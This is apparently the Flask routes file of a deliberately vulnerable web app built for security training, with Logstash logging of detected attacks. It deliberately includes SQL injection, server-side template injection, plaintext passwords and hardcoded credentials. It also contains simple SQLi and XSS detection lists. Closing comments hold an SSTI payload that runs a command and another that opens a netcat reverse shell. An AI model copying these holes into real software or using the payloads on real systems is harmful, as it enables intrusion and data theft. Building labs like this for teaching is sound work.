from flask import render_template, request, redirect, render_template_string, url_for, session
from app import app 
import mysql.connector
import logging
import logstash
import socket
import json
import os
import sys
import re
import subprocess
secret_key = 'your_secret_key'  # Replace with a strong secret key

class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_record = {
            "message": record.getMessage(),
            "level": record.levelname,
            "host": {"hostname": "server1"},
            "custom_field": "value",
        }
        return json.dumps(log_record)
        
# Logstash configuration
LOGSTASH_HOST = 'localhost'  # Change if Logstash is on another machine
LOGSTASH_PORT = 5044         # Default Logstash port for Beats input
# Database Configuration
db_config = {
    'user': 'NewUser',        # Your MySQL username
    'password': 'pouet',        # Your MySQL password
    'host': 'localhost',
    'database': 'testDBusers'   # Your database name
}

logger = logging.getLogger('vulnapp_logger')
logger.setLevel(logging.INFO)

# Add a SocketHandler for Logstash
logger.addHandler(logstash.LogstashHandler('localhost', 5959,version=1))
#logstash_handler = logging.handlers.SocketHandler(LOGSTASH_HOST, LOGSTASH_PORT)
#logstash_handler.setFormatter(CustomLogstashFormatter())
#logger.addHandler(logstash_handler)
#logger.setLevel(logging.INFO)
#handler = logging.FileHandler('/home/ubuntu/VulnApp/infos_alerts.log') # Spécifiez le chemin du fichier
#formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
#handler.setFormatter(formatter)
#logger.addHandler(handler)

# Route for handling the landing page
@app.route('/')
def landing_page():
    return render_template('landing_page.html')

@app.route('/home')
def index():
    logger.info('Welcome home')
    return render_template('index.html')

# Signup Route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        firstName = request.form['firstName']
        lastName = request.form['lastName']
        email = request.form['email']
        username = request.form['username']
        password = request.form['password']
        
        print("new User")
        logger.info('New user signup: %s, %s, %s, %s, %s ',firstName, lastName, email, username, password)

        # Hash the password for security
        #hashed_password = generate_password_hash(password, method='sha256')

        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()

        cursor.execute("INSERT INTO users (firstName, lastName, email, username, password) VALUES (%s,%s, %s, %s, %s)", (firstName, lastName, email, username, password))
        conn.commit()

        cursor.close()
        conn.close()

        return render_template('login.html')

    return render_template('signup.html')
    
'''
# Login Route
@app.route('/login', methods=['GET', 'POST'])
def login():
    msg=''
   
    print(request.form)
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        logger.info('User login attempt: %s', username)

        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor(dictionary=True)
        query ="SELECT * FROM users WHERE username= '"+username+"' AND password= '"+password+"' ;"
        print(query)
        cursor.execute(query)
        user = cursor.fetchall()
        print(user)
        cursor.close()
        conn.close()

        if user and user[0]['isModerator']==1:
            # User is authenticated
            session['username'] = username
            session['isAdmin'] = True
            logger.info('Successful admin login attempt with the username: %s', username)
            return redirect('/admin')
        elif user:
            session['username'] = username
            session['isAdmin'] = False
            logger.info('Successful login attempt with the username: %s', username)
            return redirect("user")
        else:
            # Invalid credentials
            print("Invalid Credentials")
            logger.info('Failed login attempt with the username: %s', username)
            return render_template('login.html',msg='Login Failed, Invalid Credentials !!')

    return render_template('login.html',msg=msg)
'''

@app.route('/login', methods=['GET', 'POST'])
def login():
    msg =''
    logger.info('welcome to login page')
    print("message sent")
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        List_sqli = ["'",'"','%','-']
        for let in username:
            if let in List_sqli:
                print('SQLi attempt')
                logger.warning('An attempt for SQL injection has been made with %s', username, extra={'attack_type':'SQLi'})
                return render_template('login.html',msg = 'I do not want SQLi !!, wrong characters')
        for let in password:
            if let in List_sqli:
                print('SQLi attempt')
                logger.warning('An attempt for SQL injection has been made with %s', username, extra={'attack_type':'SQLi'})
                return render_template('login.html',msg = 'I do not want SQLi !!, wrong characters')

        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor(dictionary=True)
        query = "SELECT * FROM users WHERE username= %s AND password=%s"
        cursor.execute(query, (username, password))
        user = cursor.fetchall()
        print(user)
        cursor.close()
        conn.close()

        if user and user[0]['isModerator']==1:
            # User is authenticated
            session['username'] = username
            session['isAdmin'] = True
            logger.info('Successful admin login attempt with the username: %s', username)
            return redirect('/admin')
        elif user:
            session['username'] = username
            session['isAdmin'] = False
            logger.info('Successful login attempt with the username: %s', username)
            return redirect("/user")
        else:
            # Invalid credentials
            print("Invalid Credentials")
            logger.info('Failed login attempt with the username: %s', username)
            return render_template('login.html',msg='Login Failed, Invalid Credentials !!')

    return render_template('login.html')

@app.route('/search', methods=['GET', 'POST'])
def search():
    users = []
    username_search = ""
    print(request.form)
    if request.method == 'POST':
        username_search = request.form['username']
		
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor(dictionary=True)

        query = "SELECT * FROM users WHERE username LIKE '%"+username_search+"%';"
        logger.info("search made with this input: ",username_search)
        print(query)

        cursor.execute(query)

        users = cursor.fetchall()

        cursor.close()
        conn.close()
        
        


    return render_template('search.html', users=users, search=render_template_string(username_search))
@app.route('/user')
def user_page():
    # This page can be accessed by authenticated standard users
    if 'username' not in session:
        logger.warning('Someone tried to acces the page /user without being authenticated', extra={'attack_type':'Bypass'})
        return render_template('/login.html',msg='You are not authenticated') # Redirect if not logged in
    username = render_template_string(session.get('username', 'Guest'))
    return render_template('/user.html',username=username)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if 'username' not in session:
        logger.warning('Someone tried to acces the page /user without being authenticated', extra={'attack_type':'Bypass'})
        return render_template('/login.html',msg='You are not authenticated')
    elif session['isAdmin']==0:
    	return redirect('/user')
    return render_template('admin.html')


@app.route('/admin/add', methods=['POST'])
def admin_add():
    msg_add = ''
    msg_del = ''
    msg = ''
    print(request.form)
    if request.method == 'POST':
        firstName = request.form['firstName']
        lastName = request.form['lastName']
        email = request.form['email']
        username = request.form['username']
        password = request.form['password']

        # Hash the password for security
        #hashed_password = generate_password_hash(password, method='sha256')

        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()

        cursor.execute("INSERT INTO users (firstName, lastName, email, username, password) VALUES (%s,%s, %s, %s, %s)", (firstName, lastName, email, username, password))
        conn.commit()

        cursor.close()
        conn.close()
        msg = 'User added successfully!'
        return render_template('admin.html', msg_add=msg)

@app.route('/admin/del', methods=['POST'])
def admin_del():
    msg_add = ''
    msg_del = ''
    msg = ''
    if request.method == 'POST':
        # Logic for deleting a user
        user_id = request.form['user_id']
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
        conn.commit()
        cursor.close()
        conn.close()
        msg = 'User deleted successfully!'
        return render_template('admin.html', msg_del=msg)

@app.route('/admin/search', methods=['POST'])
def admin_search():
    msg_add = ''
    msg_del = ''
    msg = ''
    users=[]
    print(request.form)
    if request.method == 'POST':
        username_search = request.form['username']
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor(dictionary=True)
        query = "SELECT * FROM users WHERE username LIKE '%"+username_search+"%';"
        cursor.execute(query,multi=True)
        users = cursor.fetchall()
        cursor.close()
        conn.close()

        return render_template('admin.html', users=users, msg=msg)
        
        
@app.route('/logout')
def logout():
    session.clear()  # Clear the session
    return redirect('/')  # Redirect to the login page

@app.route('/sqli', methods=['GET','POST'])
def sqli_page():
    users = []
    print(request.form)
    if request.method == 'POST':
        username_search = request.form['username']
        List_sqli = ["'",'"','%','-']
        for let in username_search:
            if let in List_sqli:
                print('SQLi attempt')
                logger.warning('Someone attempted a SQL injection with " %s "', username_search, extra={'attack_type':'SQLi'})
                return render_template('sqli.html',msg = 'Nice try but some characters are not authorized here, try somewhere else !')
		
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor(dictionary=True)

        query = "SELECT * FROM users WHERE username LIKE %s;"
        logger.info("SQLi search made with this input: ",username_search)
        print(query)
        cursor.execute(query, username_search)

        users = cursor.fetchall()

        cursor.close()
        conn.close()
    return render_template('sqli.html',users = users)

# Function to detect XSS payloads
def detect_xss(content):
    xss_patterns = [
        r"<script.*?>.*?</script>",  # Basic script tags
        r"javascript:.*",           # Inline JavaScript
        r"on\w+\s*=",               # Event handlers like onclick, onerror
    ]
    for pattern in xss_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    return False

@app.route('/submit_comment', methods=['POST'])
def submit_comment():
    comment = request.form.get('comment', '').strip()
    
    # Log the submitted comment
    logger.info('New comment submitted: %s', comment)
    
    if 'comments' not in globals():
        global comments
        comments = []
    
    # Detect XSS and append warning if found
    if detect_xss(comment):
        logger.warning('Potential XSS attempt detected: %s', comment, extra={'attack_type':'XSS'})
        comment += " [⚠️ Warning: Possible XSS detected.]"
    
    comments.append({'comment':render_template_string(comment),'username':session.get('username','Gest')})
    
    # Render the XSS page with the updated comments
    return render_template('xss.html', comments=comments)

@app.route('/xss')
def xss_page():
    # Render comments if they exist
    global comments
    return render_template('xss.html', comments=comments if 'comments' in globals() else [])

@app.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        # Validation de l'entrée pour prévenir l'injection de commandes
        pattern_ip = r"(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}"
        if not host or not re.search(pattern_ip,host):
            error = "Hôte invalide. Veuillez saisir un nom d'hôte alphanumérique."
            logger.warning('Potential Command Injection attempt detected: %s', host,extra={'attack_type':'Command Injection'})
            return render_template('ping.html', error=error)

        # Construction de la commande ping
        command = ['ping', '-c', '4', host]  # -c 4 limite le nombre de pings à 4

        try:
            # Exécution de la commande ping
            result = subprocess.check_output(command, text=True)
            logger.info('Pinged the address: %s', host)
            return render_template('ping.html', result=result)
        except subprocess.CalledProcessError as e:
            error = f"Erreur lors de l'exécution de la commande ping : {e}"
            return render_template('ping.html', error=error)

    return render_template('ping.html')
    
@app.route("/test", methods=['GET'])
def home():
    name = request.args.get('name') or None # get untrusted query param
    greeting = render_template_string(name) # render it into template
    return render_template('pouet.html',greeting=greeting)
    
    # http://10.212.8.52:5000/test?name="{{%20"foo".__class__.__base__.__subclasses__()[222].__init__.__globals__[%27sys%27].modules[%27os%27].popen("ls").read()}}" ssti example
    # {{''.__class__.__mro__[1].__subclasses__()[223] ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.212.8.28 4578 >/tmp/f',shell=True,stdout=-1).communicate()}} for ssti reverse shell
    
    
